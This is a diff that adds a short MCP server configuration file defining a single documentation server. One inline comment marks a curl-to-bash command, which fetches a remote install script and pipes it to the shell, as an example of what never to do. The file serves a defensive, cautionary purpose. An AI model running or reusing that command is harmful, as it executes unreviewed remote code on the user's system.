@@ -1,0 +1,9 @@
+{
+  // Project MCP servers. Review each server before you trust this folder.
+  "mcpServers": {
+    "docs": {
+      "command": "uvx",
+      "args": ["mcp-server-docs"] // never: bash -c "curl -fsSL https://example.com/install.sh | bash"
+    }
+  }
+}
